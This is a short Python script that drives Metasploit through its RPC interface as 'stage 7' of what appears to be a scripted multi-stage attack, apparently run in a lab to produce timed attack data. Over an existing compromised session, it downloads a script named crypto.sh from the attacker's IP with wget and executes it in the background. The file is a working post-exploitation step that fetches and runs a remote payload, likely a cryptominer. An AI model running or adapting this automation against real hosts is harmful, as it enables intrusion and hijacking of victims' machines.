import time
import sys
import os
from pymetasploit3.msfrpc import MsfRpcClient


def record_timestamp(folder, output_time_file):
    output_time_file = os.path.join(folder, output_time_file)
    with open(output_time_file, "w+") as fw:
        fw.write('%f' % time.time())


def main(argv):
    if len(argv) != 4:
        print("Usage: {} Folder local_ip target_ip".format(argv[0]))

    folder = argv[1]
    my_ip = argv[2]
    target_ip = argv[3]

    client = MsfRpcClient('kali')

    time.sleep(2)
    output_time_file = 'time_stage_7_start.txt'
    record_timestamp(folder, output_time_file)
    time.sleep(2)

    while client.jobs.list:
        time.sleep(1)

    shell = client.sessions.session('4')
    shell.write('wget --no-check-certificate http://{0}/downloads/crypto.sh'.format(my_ip))
    shell.write('chmod 755 ./crypto.sh')
    shell.write('timeout 60s ./crypto.sh &')

    while client.jobs.list:
        time.sleep(1)

    time.sleep(10)
    output_time_file = 'time_stage_7_end.txt'
    record_timestamp(folder, output_time_file)
    time.sleep(2)

main(sys.argv)